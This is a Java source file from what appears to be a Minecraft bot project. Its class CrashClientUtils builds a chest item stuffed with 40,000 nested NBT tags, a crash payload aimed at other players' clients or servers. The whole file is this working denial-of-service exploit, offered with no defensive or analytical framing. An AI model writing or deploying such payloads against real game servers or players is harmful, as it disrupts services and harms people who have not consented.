package cz.GravelCZLP.MinecraftBot.Utils;

import java.util.ArrayList;

import org.spacehq.mc.protocol.data.game.entity.metadata.ItemStack;
import org.spacehq.mc.protocol.data.game.entity.player.GameMode;
import org.spacehq.opennbt.tag.builtin.CompoundTag;
import org.spacehq.opennbt.tag.builtin.ListTag;
import org.spacehq.opennbt.tag.builtin.Tag;

import cz.GravelCZLP.MinecraftBot.Bots.Bot;
import cz.GravelCZLP.MinecraftBot.Inventory.Inventory;

public class CrashClientUtils {

	public static ItemStack getCrashChest(Bot bot) {
		if (bot.getGameMode() != GameMode.CREATIVE) {
			return null;
		}
		if (bot.getInventory() instanceof Inventory) {
			Inventory botInv = (Inventory) bot.getInventory();
			if (botInv.getItemInArmor(3).getId() == 0) {
				CompoundTag ctag = new CompoundTag("GravelCZLPLolololoolloololoo");
				ArrayList<Tag> list = new ArrayList<>();
				for (int i = 0; i < 40000; i++) {
					list.add(new CompoundTag("GravelCZLPLolololoolloololoo"));
				}
				ListTag tagList = new ListTag("GravelCZLPLolololoolloololoo", list);
				ctag.put(tagList);
				ItemStack chest = new ItemStack(54, 1, 0, ctag);
				return chest;
			}
		}
		return null;
	}
	
}
